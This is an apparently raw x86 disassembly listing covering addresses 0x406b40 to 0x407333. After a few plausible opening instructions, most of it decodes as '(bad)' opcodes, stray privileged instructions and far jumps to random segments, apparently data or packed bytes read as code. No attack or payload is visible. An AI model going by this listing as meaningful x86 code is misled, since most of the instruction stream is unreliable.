  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xebfb6e5f
  406b85:	or     BYTE PTR [edx],al
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0xe87e7e7f
  406b8f:	retf   
  406b90:	adc    ch,bl
  406b92:	and    cl,dh
  406b94:	jmp    0x406bf6
  406b96:	push   ds
  406b97:	inc    edx
  406b98:	pop    eax
  406b99:	cmp    al,0x4e
  406b9b:	xchg   edi,eax
  406b9c:	(bad)  
  406b9d:	jns    0x406ba1
  406b9f:	xor    al,0x56
  406ba1:	fistp  WORD PTR [ecx]
  406ba3:	into   
  406ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ba5:	mov    WORD PTR [edx+0x69],?
  406ba8:	in     al,0xf7
  406baa:	mov    bh,0x69
  406bac:	pop    ss
  406bad:	mov    al,0x87
  406baf:	mov    ebp,0x50657015
  406bb4:	xor    esi,0x773e72e9
  406bba:	repz hlt 
  406bbc:	sub    BYTE PTR [ebx-0x388af72c],dl
  406bc2:	add    ah,BYTE PTR [ecx-0x3cd2ede0]
  406bc8:	mov    al,0x52
  406bca:	iret   
  406bcb:	mov    ebx,0xe67e07b9
  406bd0:	(bad)  
  406bd2:	cmp    bh,dh
  406bd4:	mov    ebx,0x143bc35e
  406bd9:	fdivr  DWORD PTR [esi-0x59a47990]
  406bdf:	mov    edx,0xd47e1710
  406be4:	pusha  
  406be5:	sbb    BYTE PTR [edx+0x2c57c8f5],dl
  406beb:	xchg   DWORD PTR [esi+ecx*1-0x9f1a340],eax
  406bf2:	xlat   BYTE PTR ds:[ebx]
  406bf3:	icebp  
  406bf4:	adc    DWORD PTR [eax+0x71],edi
  406bf7:	push   ebx
  406bf8:	jae    0x406bbc
  406bfa:	repnz outs dx,BYTE PTR ds:[esi]
  406bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bfe:	cmp    BYTE PTR [edi+0x5ec28197],0x28
  406c05:	xchg   esi,eax
  406c06:	fisttp WORD PTR [ebx+0xa]
  406c09:	inc    ebp
  406c0a:	mov    ebx,0x64594930
  406c0f:	mov    esi,0x9aaeac00
  406c14:	outs   dx,DWORD PTR ds:[esi]
  406c15:	xchg   edx,eax
  406c16:	lods   al,BYTE PTR ds:[esi]
  406c17:	pop    edi
  406c18:	clc    
  406c19:	pop    ecx
  406c1a:	cmp    esi,DWORD PTR [esi-0x34b6de1e]
  406c20:	mov    dh,0x7c
  406c22:	push   0xfffffff9
  406c24:	int    0xd8
  406c26:	retf   
  406c27:	and    BYTE PTR [esi],dh
  406c29:	jb     0x406bae
  406c2b:	xor    eax,0x4a2916a9
  406c30:	retf   
  406c31:	adc    BYTE PTR [eax-0x7f],bl
  406c34:	sub    bh,BYTE PTR [ecx-0x74]
  406c37:	push   es
  406c38:	enter  0xb22b,0x60
  406c3c:	shl    BYTE PTR ds:0x1d6aa569,cl
  406c42:	adc    bh,bl
  406c44:	sub    al,0x4
  406c46:	add    DWORD PTR [ecx+eax*4-0x62a7f859],ecx
  406c4d:	push   eax
  406c4e:	fsubr  QWORD PTR [ebx]
  406c50:	jb     0x406c3a
  406c52:	pop    edx
  406c53:	inc    ecx
  406c54:	sub    dh,BYTE PTR [edx-0x35488c15]
  406c5a:	jnp    0x406c84
  406c5c:	xchg   ebp,eax
  406c5d:	scas   eax,DWORD PTR es:[edi]
  406c5e:	mov    BYTE PTR [ebp+0x55],0xd6
  406c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c63:	xchg   esp,eax
  406c64:	sub    edx,DWORD PTR [edx+0x3c]
  406c67:	add    dh,bh
  406c69:	push   edi
  406c6a:	lods   eax,DWORD PTR ds:[esi]
  406c6b:	push   es
  406c6c:	mov    dh,BYTE PTR [ecx+0x4bdb2140]
  406c72:	jle    0x406c32
  406c74:	mov    ah,0x17
  406c76:	int3   
  406c77:	loope  0x406c02
  406c79:	inc    ebp
  406c7a:	sub    ebx,DWORD PTR [eax]
  406c7c:	or     ebp,DWORD PTR [ebp-0x46]
  406c7f:	jae    0x406c40
  406c81:	jb     0x406c5d
  406c83:	push   0xee0096a5
  406c88:	or     bl,BYTE PTR [esi]
  406c8a:	aad    0x3e
  406c8c:	inc    edi
  406c8d:	aam    0xa1
  406c8f:	test   BYTE PTR [esi+0x31a6154d],ch
  406c95:	xor    ch,BYTE PTR [edx]
  406c97:	add    al,0x4b
  406c99:	inc    esi
  406c9a:	sbb    edi,DWORD PTR [ebx+0x55]
  406c9d:	add    dh,BYTE PTR [eax+0x79becaa]
  406ca3:	sub    edi,0xffffffd3
  406ca6:	daa    
  406ca7:	aam    0xbe
  406ca9:	jge    0x406d20
  406cab:	mov    ebp,0x399fe10f
  406cb0:	iret   
  406cb1:	cmp    cl,ch
  406cb3:	cs scas eax,DWORD PTR es:[edi]
  406cb5:	nop
  406cb6:	imul   esp,DWORD PTR [edi+0x1b407c8f],0x63
  406cbd:	adc    DWORD PTR [eax+0x63],esp
  406cc0:	xor    al,0x6e
  406cc2:	pop    ss
  406cc3:	cwde   
  406cc4:	sbb    BYTE PTR [ebx+0x310c719c],0xde
  406ccb:	add    dl,ah
  406ccd:	ror    DWORD PTR [edx+edi*8+0x9],1
  406cd1:	mov    dl,0xf6
  406cd3:	sub    bh,BYTE PTR [edx-0x2a]
  406cd6:	or     ecx,DWORD PTR [ebp+0x30]
  406cd9:	jmp    0x65fd:0x7181d3ec
  406ce0:	hlt    
  406ce1:	dec    ecx
  406ce2:	pusha  
  406ce3:	sub    BYTE PTR [esi+0x381eb81b],dl
  406ce9:	mov    ebp,DWORD PTR [ebx+esi*2+0x6f8e620b]
  406cf0:	sbb    DWORD PTR [eax-0x20],edi
  406cf3:	and    eax,0x49a39511
  406cf8:	jge    0x406d3c
  406cfa:	mov    edi,0xdb1abf78
  406cff:	adc    ebx,ebp
  406d01:	pop    edx
  406d02:	call   0x6affd130
  406d07:	loop   0x406d2a
  406d09:	data16 mov dl,0x5c
  406d0c:	(bad)  
  406d0d:	iret   
  406d0e:	cmp    al,0xad
  406d10:	or     esp,DWORD PTR [esi-0x1341ee37]
  406d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d17:	inc    esp
  406d18:	dec    esi
  406d19:	ins    DWORD PTR es:[edi],dx
  406d1a:	loopne 0x406d43
  406d1c:	cdq    
  406d1d:	jmp    0x412f:0x9a5a9687
  406d24:	retf   
  406d25:	loope  0x406d3c
  406d27:	dec    eax
  406d28:	ret    0x5dad
  406d2b:	mov    eax,0x6cdc64e6
  406d30:	out    0x21,al
  406d32:	adc    dh,0xd
  406d35:	data16 or al,0x17
  406d38:	xlat   BYTE PTR ds:[bx]
  406d3a:	call   DWORD PTR [ebp+0x64f0633e]
  406d40:	cmc    
  406d41:	lahf   
  406d42:	pushf  
  406d43:	fs or  eax,0xe5b55d21
  406d49:	jecxz  0x406cdb
  406d4b:	aas    
  406d4c:	std    
  406d4d:	out    0xeb,al
  406d4f:	add    ah,BYTE PTR [esi+0x33]
  406d52:	sar    DWORD PTR [ecx+0x3b02],0x81
  406d59:	sbb    eax,0x43382f
  406d5e:	adc    esi,DWORD PTR [edi]
  406d60:	inc    ebx
  406d61:	add    BYTE PTR [esi+0x3],ah
  406d64:	rol    DWORD PTR [ecx+0x43382305],0x0
  406d6b:	push   edi
  406d6c:	jge    0x406d6e
  406d6e:	add    BYTE PTR [ebx-0x48f0f7b3],cl
  406d74:	rol    BYTE PTR [ecx+0x4337631d],0x0
  406d7b:	getsec 
  406d7d:	inc    ebx
  406d7e:	add    cl,ch
  406d80:	fiadd  DWORD PTR [ecx]
  406d82:	add    BYTE PTR [eax],al
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x49
  406d91:	test   al,0x89
  406d93:	dec    ebx
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x527e7e7f
  406d9d:	sbb    ebx,DWORD PTR [eax+ecx*8+0x3d]
  406da1:	dec    BYTE PTR [eax+0x31]
  406da4:	loop   0x406d82
  406da6:	and    ch,BYTE PTR [ebx-0x2]
  406da9:	inc    esi
  406daa:	cdq    
  406dab:	pop    edi
  406dac:	or     DWORD PTR [ebx+0x2d],edx
  406daf:	nop
  406db0:	mov    edi,0x684463b7
  406db5:	fs leave 
  406db7:	push   ecx
  406db8:	test   eax,0x9e80d8ef
  406dbd:	mov    dl,0xcd
  406dbf:	call   0x2339a0a1
  406dc4:	leave  
  406dc5:	inc    ebp
  406dc6:	fs mov esp,esi
  406dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dca:	jmp    0x8f55:0x809c2cff
  406dd1:	dec    esp
  406dd2:	jb     0x406e09
  406dd4:	fcom   QWORD PTR [edi]
  406dd6:	adc    DWORD PTR [esi+0x52c21236],ecx
  406ddc:	imul   ecx,edx,0xda95c4fd
  406de2:	outs   dx,DWORD PTR ds:[esi]
  406de3:	fdivr  DWORD PTR [edi]
  406de5:	arpl   WORD PTR [ebp+0x4cbe22a7],di
  406deb:	and    edi,edx
  406ded:	inc    edi
  406dee:	test   BYTE PTR cs:[ebx-0x9],0x64
  406df3:	xor    esp,DWORD PTR [ecx-0x5e392bf5]
  406df9:	call   0x223f:0xf093697c
  406e00:	daa    
  406e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e02:	mov    ebx,0xb4be051a
  406e07:	xor    al,0xee
  406e09:	das    
  406e0a:	and    al,0x6d
  406e0c:	daa    
  406e0d:	or     ebx,ebp
  406e0f:	xchg   esi,eax
  406e10:	adc    eax,0xcb125f69
  406e15:	arpl   WORD PTR [eax+0x55],ax
  406e18:	inc    ebp
  406e19:	out    dx,eax
  406e1a:	outs   dx,BYTE PTR ds:[esi]
  406e1b:	repz xor dl,BYTE PTR [esi+ebp*1+0x6cc51232]
  406e23:	push   ds
  406e24:	push   esp
  406e25:	popf   
  406e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e27:	mov    ah,0xc4
  406e29:	inc    esi
  406e2a:	push   ss
  406e2b:	jmp    0x406e6c
  406e2d:	jno    0x406e9f
  406e2f:	lahf   
  406e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e31:	bound  esi,QWORD PTR [ebp+edx*1+0x61277772]
  406e38:	ja     0x406e5c
  406e3a:	xchg   dh,al
  406e3c:	push   edi
  406e3d:	enter  0xb5a1,0x45
  406e41:	les    edi,FWORD PTR ds:0x764ee8a4
  406e47:	mov    edi,0x77b9fc3e
  406e4c:	jnp    0x406e50
  406e4e:	(bad)  
  406e4f:	and    esi,DWORD PTR [edx+0x47]
  406e52:	inc    ebp
  406e53:	adc    ebx,DWORD PTR [edx+0x21]
  406e56:	push   0x34e0edaa
  406e5b:	mov    bh,0x34
  406e5d:	fs fwait
  406e5f:	mov    cl,0xbd
  406e61:	or     DWORD PTR [ebp+0x6ae9e050],edi
  406e67:	popa   
  406e68:	sahf   
  406e69:	mov    esp,0x245bdedb
  406e6e:	xlat   BYTE PTR ds:[ebx]
  406e6f:	cdq    
  406e70:	out    dx,eax
  406e71:	pop    ebx
  406e72:	dec    edx
  406e73:	js     0x406e0c
  406e75:	xor    ebp,eax
  406e77:	stos   DWORD PTR es:[edi],eax
  406e78:	cdq    
  406e79:	push   es
  406e7a:	adc    eax,0x692ff4b7
  406e7f:	mov    ds:0x379a0dc4,eax
  406e84:	jp     0x406e0b
  406e86:	or     DWORD PTR [edi+edi*2],eax
  406e89:	push   esp
  406e8a:	xchg   edi,eax
  406e8b:	and    dh,ch
  406e8d:	pop    ebx
  406e8e:	aad    0xe
  406e90:	in     eax,dx
  406e91:	rcr    DWORD PTR [eax],cl
  406e93:	rcr    DWORD PTR [ebp+0x42],0x67
  406e97:	loop   0x406e1f
  406e99:	(bad)  
  406e9a:	ins    DWORD PTR es:[edi],dx
  406e9b:	shl    BYTE PTR [edx-0x33a79ecc],1
  406ea1:	xchg   ecx,eax
  406ea2:	ja     0x406f15
  406ea4:	pop    edx
  406ea5:	push   ebp
  406ea6:	cld    
  406ea7:	sbb    cl,BYTE PTR [ecx-0x1605ed96]
  406ead:	inc    ecx
  406eae:	pop    es
  406eaf:	lods   eax,DWORD PTR ds:[esi]
  406eb0:	scas   eax,DWORD PTR es:[edi]
  406eb1:	jmp    0x406eb7
  406eb3:	jle    0x406f22
  406eb5:	pop    edi
  406eb6:	(bad)  
  406eb7:	mov    es,WORD PTR [ebp+0x35]
  406eba:	sub    ah,dh
  406ebc:	pop    esi
  406ebd:	jp     0x406ec5
  406ebf:	pushf  
  406ec0:	mov    ds:0x7f6e145,eax
  406ec5:	adc    al,0xd2
  406ec7:	cs jmp 0xeb2f628e
  406ecd:	int    0x6a
  406ecf:	mov    esi,DWORD PTR [esi+0x38fc9c87]
  406ed5:	stos   DWORD PTR es:[edi],eax
  406ed6:	or     DWORD PTR [ecx+0x6a947851],ebp
  406edc:	scas   eax,DWORD PTR es:[edi]
  406edd:	clc    
  406ede:	and    al,al
  406ee0:	ss mov ebx,0xe24ea6f8
  406ee6:	ds dec ebp
  406ee8:	mov    eax,ds:0x9f7ab7e3
  406eed:	mov    edi,0x9d5fcba4
  406ef2:	mov    eax,0x1b294e5b
  406ef7:	add    dl,BYTE PTR [ebp+0x9]
  406efa:	pop    edx
  406efb:	not    eax
  406efd:	pop    edx
  406efe:	sub    ecx,DWORD PTR [ebx]
  406f00:	ss dec esp
  406f02:	add    eax,0x622ea42
  406f07:	enter  0x6de0,0x1d
  406f0b:	mov    esp,eax
  406f0d:	inc    eax
  406f0e:	xlat   BYTE PTR ds:[ebx]
  406f0f:	jmp    0x264df96c
  406f14:	enter  0x25a7,0x2d
  406f18:	add    al,cl
  406f1a:	sub    al,0x21
  406f1c:	mov    eax,0x804ac80c
  406f21:	jmp    0x3d98:0xa70a2a7a
  406f28:	cmc    
  406f29:	aas    
  406f2a:	dec    edx
  406f2b:	sub    DWORD PTR [ebp-0x54],0xffffff86
  406f2f:	leave  
  406f30:	push   eax
  406f31:	cld    
  406f32:	call   DWORD PTR [edi+0x63fbb305]
  406f38:	or     ebp,ecx
  406f3a:	add    eax,0x31aaf259
  406f3f:	xchg   BYTE PTR [edi-0x1b],bl
  406f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f43:	jo     0x406f74
  406f45:	sbb    DWORD PTR [ebx+0x72],0xffffffb6
  406f49:	mov    edi,0xe91eac30
  406f4e:	cld    
  406f4f:	cmp    eax,edi
  406f51:	into   
  406f52:	not    BYTE PTR [ecx-0x4e]
  406f55:	(bad)  
  406f56:	pop    ebp
  406f57:	imul   edi,esp,0xabe4b90c
  406f5d:	jg     0x406f56
  406f5f:	rol    BYTE PTR [ecx+0x43370f25],1
  406f65:	add    BYTE PTR [ebx+0x37],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x9cb1b2e5
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x537e7e7f
  406f9f:	shl    BYTE PTR [esi*8-0x728e527c],0xd8
  406fa7:	sbb    eax,0x39471d32
  406fac:	iret   
  406fad:	aam    0xaa
  406faf:	mov    edi,0x9ab45f73
  406fb4:	cmp    ch,BYTE PTR [eax+0x71cff0cd]
  406fba:	out    dx,eax
  406fbb:	shl    eax,cl
  406fbd:	cmp    al,BYTE PTR [edx+0x6d4fcc9b]
  406fc3:	cs in  eax,0x8c
  406fc6:	jae    0x406fff
  406fc8:	jmp    0x65d4bd9c
  406fcd:	mov    DWORD PTR [eax+esi*4-0x393c44b3],edi
  406fd4:	mov    edx,0x78ad1033
  406fd9:	push   edx
  406fda:	clc    
  406fdb:	call   0xf94c2a25
  406fe0:	ja     0x407041
  406fe2:	jle    0x406fb6
  406fe4:	push   ds
  406fe5:	outs   dx,BYTE PTR ds:[esi]
  406fe6:	je     0x407029
  406fe8:	les    edx,FWORD PTR ds:0x5da3e9f
  406fee:	cmp    al,0xbc
  406ff0:	push   ss
  406ff1:	retf   
  406ff2:	out    0x60,eax
  406ff4:	call   0x48a8aaa
  406ff9:	test   DWORD PTR [eax+0x1ca1b79d],ebx
  406fff:	lock xor eax,DWORD PTR [esi-0x208f8f8d]
  407006:	mov    ecx,0x25d749ee
  40700b:	xchg   esi,eax
  40700c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40700d:	sub    BYTE PTR [esi],al
  40700f:	js     0x406fb6
  407011:	sub    al,0xa5
  407013:	add    BYTE PTR [esi],0x5d
  407016:	mov    ebp,0x675b281f
  40701b:	mov    WORD PTR [ebp+0x38],cs
  40701e:	fcmovnb st,st(6)
  407020:	in     eax,0x4f
  407022:	fild   QWORD PTR [ebx-0x2d]
  407025:	push   esp
  407026:	test   al,0x6d
  407028:	jp     0x406fd5
  40702a:	push   eax
  40702c:	mul    ch
  40702e:	xchg   esi,eax
  40702f:	in     eax,0xd7
  407031:	aaa    
  407032:	adc    al,0x26
  407034:	and    DWORD PTR [edi-0x431c0fee],edi
  40703a:	(bad)  
  40703c:	mov    eax,ds:0xed96a0fe
  407041:	les    ebx,FWORD PTR [ecx-0x3155a3ec]
  407047:	inc    ecx
  407048:	nop
  407049:	pop    ebp
  40704a:	outs   dx,BYTE PTR ds:[esi]
  40704b:	jmp    0x28df:0xa44648af
  407052:	dec    ebp
  407053:	pop    ebx
  407054:	lea    edi,ds:0xcedd4868
  40705a:	(bad)  [edx+0xe8e45e]
  407060:	js     0x40708f
  407062:	test   DWORD PTR ds:0xd3795565,0x47b2453c
  40706c:	or     eax,0x95822911
  407071:	mov    bl,0x44
  407073:	lods   al,BYTE PTR ds:[esi]
  407074:	int3   
  407075:	push   esp
  407076:	idiv   DWORD PTR [eax+eiz*8-0x1d933de3]
  40707d:	adc    cl,ah
  40707f:	fcomp  DWORD PTR [edx]
  407081:	pop    es
  407082:	inc    ebp
  407083:	mov    dl,BYTE PTR [ebx]
  407085:	dec    esp
  407086:	mov    WORD PTR [edi+0x63],ss
  407089:	call   0x88376a82
  40708e:	xchg   esi,eax
  40708f:	xchg   edi,eax
  407090:	push   ds
  407091:	inc    ebx
  407092:	(bad)  
  407093:	mov    edx,ss
  407095:	jmp    0x40707a
  407097:	sub    al,0x3c
  407099:	pop    ss
  40709a:	mov    eax,0x8be0653e
  40709f:	add    DWORD PTR [ecx-0x7cdf4acf],0xd182868a
  4070a9:	sbb    al,0xf7
  4070ab:	push   ebx
  4070ac:	and    al,0xc8
  4070ae:	pop    esp
  4070af:	test   DWORD PTR [edx],ebx
  4070b1:	inc    esp
  4070b2:	push   eax
  4070b3:	push   ss
  4070b4:	aad    0x8e
  4070b6:	sub    ch,BYTE PTR [esi+0x11c7c97e]
  4070bc:	mov    dl,0x7
  4070be:	xchg   esp,eax
  4070bf:	xor    cl,BYTE PTR [ebx-0x418e589c]
  4070c5:	jmp    0x3e51b6f2
  4070ca:	inc    ebp
  4070cb:	fsubr  DWORD PTR [edx-0x30]
  4070ce:	xchg   esi,eax
  4070cf:	pop    edi
  4070d0:	mov    ebx,0xaa9c8a0b
  4070d5:	lock adc BYTE PTR ss:[ecx-0x15],ah
  4070da:	popf   
  4070db:	aas    
  4070dc:	out    0x2,eax
  4070de:	adc    BYTE PTR [ebp-0x27e38b2a],dh
  4070e4:	clc    
  4070e5:	or     DWORD PTR [esi-0x5a],ebp
  4070e8:	in     al,0xe7
  4070ea:	or     bh,BYTE PTR [edx]
  4070ec:	aad    0x72
  4070ee:	arpl   bp,cx
  4070f0:	jae    0x40709e
  4070f2:	fbstp  TBYTE PTR [ecx-0x4db54a5f]
  4070f8:	xchg   ebx,eax
  4070f9:	test   eax,0xaaef16e1
  4070fe:	cs push edi
  407100:	fs loope 0x40710a
  407103:	pop    ebx
  407104:	jmp    0x4070a7
  407106:	lea    eax,[edi+0x79]
  407109:	sbb    eax,0x14a72779
  40710e:	test   DWORD PTR [ebx+edi*8+0x46876793],0x53f68e7e
  407119:	jbe    0x407168
  40711b:	out    dx,al
  40711c:	jmp    0x407152
  40711e:	das    
  40711f:	fadd   DWORD PTR [edx]
  407121:	test   al,0xaf
  407123:	inc    ebp
  407124:	(bad)  
  407125:	not    DWORD PTR [esp+edi*1+0x49f8162]
  40712c:	enter  0xe02b,0xe8
  407130:	adc    ch,BYTE PTR [esi-0x59]
  407133:	lds    esp,FWORD PTR [ecx+0x17]
  407136:	dec    ebx
  407137:	rol    DWORD PTR [ebx],1
  407139:	pop    ebp
  40713a:	xchg   DWORD PTR [ecx],edx
  40713c:	cmp    al,0x59
  40713e:	pop    ecx
  40713f:	sbb    BYTE PTR [ebp+0x46],ch
  407142:	push   es
  407143:	push   ss
  407144:	sub    ecx,esp
  407146:	(bad)
  407149:	(bad)  
  40714a:	stc    
  40714b:	or     esi,ecx
  40714d:	das    
  40714e:	xchg   edx,eax
  40714f:	mov    es,WORD PTR [ebp-0x17]
  407152:	das    
  407153:	(bad)  
  407154:	std    
  407155:	pop    esi
  407156:	cmp    DWORD PTR [ebp+0x16],ecx
  407159:	xchg   esp,eax
  40715a:	dec    ebx
  40715b:	std    
  40715c:	je     0x40714d
  40715e:	and    esi,esp
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	imul   esp,esp,0x6c
  40717e:	fmulp  st(4),st
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x707e7e7f
  407188:	xchg   BYTE PTR [edx-0x224b64cf],bh
  40718e:	mov    dl,0x43
  407190:	popa   
  407191:	jp     0x40718c
  407193:	adc    DWORD PTR [ebp-0x17],eax
  407196:	pop    esp
  407197:	push   edi
  407198:	aad    0x63
  40719a:	icebp  
  40719b:	neg    cl
  40719d:	in     eax,dx
  40719e:	daa    
  40719f:	cwde   
  4071a0:	and    al,0xde
  4071a2:	adc    al,0xb
  4071a4:	xor    esp,DWORD PTR [esi+0x6a]
  4071a7:	ret    0xeddd
  4071aa:	fld    DWORD PTR [ecx-0x170d1a37]
  4071b0:	(bad)  
  4071b1:	retf   
  4071b2:	fistp  QWORD PTR [ebp-0x4c89363f]
  4071b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071b9:	push   ecx
  4071ba:	or     al,0x64
  4071bc:	cdq    
  4071bd:	js     0x40713f
  4071bf:	(bad)  
  4071c0:	clc    
  4071c1:	pop    edi
  4071c2:	pop    ebp
  4071c3:	push   ds
  4071c4:	xchg   edi,eax
  4071c5:	add    al,0xfd
  4071c7:	sbb    al,0xe9
  4071c9:	pusha  
  4071ca:	xchg   esi,eax
  4071cb:	fwait
  4071cc:	mov    al,0x1d
  4071ce:	inc    ecx
  4071cf:	xchg   esp,eax
  4071d0:	xor    bl,BYTE PTR [edi+0x17c2e96]
  4071d6:	mov    edi,0xd7d8bbf1
  4071db:	or     edx,esp
  4071dd:	(bad)  
  4071df:	ss mov ebp,0x16c7694f
  4071e5:	retf   0x3668
  4071e8:	js     0x4071ce
  4071ea:	mov    ebx,0xa833977c
  4071ef:	loope  0x407186
  4071f1:	and    dl,cl
  4071f3:	daa    
  4071f4:	faddp  st(0),st
  4071f6:	pop    ebp
  4071f7:	jg     0x407180
  4071f9:	mov    bh,0xb0
  4071fb:	mov    al,0x3f
  4071fd:	call   0x5d40:0x5a5ca6d
  407204:	lahf   
  407205:	out    0xa3,al
  407207:	fisttp QWORD PTR [eax+0x41]
  40720a:	ret    0x37ae
  40720d:	in     al,dx
  40720e:	adc    cl,BYTE PTR [edi]
  407210:	mov    BYTE PTR [esi-0x62],ch
  407213:	lea    ebx,[edi]
  407215:	stos   BYTE PTR es:[edi],al
  407216:	in     eax,dx
  407217:	cmp    edi,ebp
  407219:	pop    edx
  40721a:	cmp    BYTE PTR [ebx+0x73],dh
  40721d:	mov    ah,0x8f
  40721f:	call   0x21f281e4
  407224:	xor    ebp,eax
  407226:	lds    ebx,FWORD PTR [ecx+0x7f]
  407229:	sub    bl,0xed
  40722c:	(bad)  
  40722e:	retf   
  40722f:	cmp    esi,eax
  407231:	pop    es
  407232:	adc    al,0x63
  407234:	sbb    DWORD PTR [esi+0x79],0x3c70d2c5
  40723b:	push   edi
  40723c:	test   DWORD PTR [edx+0x108aab85],esp
  407242:	push   edx
  407243:	lods   eax,DWORD PTR ds:[esi]
  407244:	popa   
  407245:	jle    0x407290
  407247:	xchg   BYTE PTR [ecx+0x46],dl
  40724a:	scas   eax,DWORD PTR es:[edi]
  40724b:	mov    al,ds:0x63d09a39
  407250:	lods   ax,WORD PTR ds:[esi]
  407252:	ins    DWORD PTR es:[edi],dx
  407253:	pop    eax
  407254:	(bad)
  407258:	inc    eax
  407259:	jl     0x4072c6
  40725b:	enter  0x3fd3,0x6a
  40725f:	outs   dx,DWORD PTR ds:[esi]
  407260:	ret    
  407261:	pop    ebp
  407262:	mov    ebx,0xd01c790c
  407267:	mov    al,0xd8
  407269:	dec    esp
  40726a:	mov    eax,ds:0xf08865f9
  40726f:	adc    cl,BYTE PTR [ebp-0x34]
  407272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407273:	xor    eax,DWORD PTR [edi-0x41]
  407276:	ret    
  407277:	push   edi
  407278:	(bad)  
  407279:	mov    ch,0xd8
  40727b:	repz je 0x40724e
  40727e:	xchg   dl,cl
  407280:	dec    ebp
  407281:	jp     0x407269
  407283:	inc    ebp
  407284:	int    0xf5
  407286:	and    BYTE PTR [ebx+0x63],dh
  407289:	outs   dx,BYTE PTR ds:[esi]
  40728a:	loope  0x4072d2
  40728c:	test   eax,0xf36027b7
  407291:	lds    eax,FWORD PTR [edi]
  407293:	pop    esi
  407294:	aam    0x37
  407296:	inc    eax
  407297:	mov    eax,0xc29a8408
  40729c:	jno    0x4072c0
  40729e:	rcr    BYTE PTR [ebx],0xaa
  4072a1:	jns    0x407249
  4072a3:	lds    ecx,FWORD PTR [ebx+0x6fab952d]
  4072a9:	aaa    
  4072aa:	push   ds
  4072ab:	mov    eax,ds:0x5e336340
  4072b0:	jp     0x40727a
  4072b2:	ins    BYTE PTR es:[edi],dx
  4072b3:	outs   dx,BYTE PTR ds:[esi]
  4072b4:	mov    al,0x7f
  4072b6:	mov    dl,dh
  4072b8:	and    esp,edx
  4072ba:	xchg   ecx,eax
  4072bb:	lahf   
  4072bc:	and    eax,0x80741fb
  4072c1:	push   eax
  4072c2:	sbb    dl,al
  4072c4:	imul   esp,DWORD PTR [ecx],0x1d908f2b
  4072ca:	xchg   esi,eax
  4072cb:	stos   BYTE PTR es:[edi],al
  4072cc:	sbb    BYTE PTR [edi-0x4fa4fb12],dl
  4072d2:	inc    edi
  4072d3:	mov    ecx,0x91211029
  4072d8:	mov    ebp,0x27d0a606
  4072dd:	inc    edi
  4072de:	push   esi
  4072df:	jo     0x40731f
  4072e1:	sbb    BYTE PTR [ebx+edx*2],dh
  4072e4:	dec    ebx
  4072e5:	dec    eax
  4072e6:	and    al,0x3f
  4072e8:	push   ecx
  4072e9:	or     eax,0xa79254a3
  4072ee:	and    DWORD PTR [esi-0xa],0xffffff9e
  4072f2:	xor    DWORD PTR [eax+0x7ae16653],eax
  4072f8:	test   al,0xa7
  4072fa:	outs   dx,DWORD PTR ds:[esi]
  4072fb:	adc    BYTE PTR [eax],ch
  4072fd:	enter  0x34ed,0x53
  407301:	jbe    0x40735c
  407303:	test   ebp,ecx
  407305:	outs   dx,DWORD PTR ds:[esi]
  407306:	ins    DWORD PTR es:[edi],dx
  407307:	loopne 0x4072cb
  407309:	and    cl,BYTE PTR ds:0xc0e03b66
  40730f:	or     eax,0x889e0f52
  407314:	jmp    0x4597472a
  407319:	shl    bl,1
  40731b:	xor    al,0x4d
  40731d:	xor    DWORD PTR [eax-0x63a78bf9],esi
  407323:	fucomi st,st(7)
  407325:	jmp    0x4072ca
  407327:	ins    DWORD PTR es:[edi],dx
  407328:	fidiv  WORD PTR [ebx-0x77]
  40732b:	lock mov dl,0x12
  40732e:	out    0x96,al
  407330:	dec    esp
  407331:	(bad)  
  407332:	inc    ebp
  407333:	gs mov eax,0x18a5b922
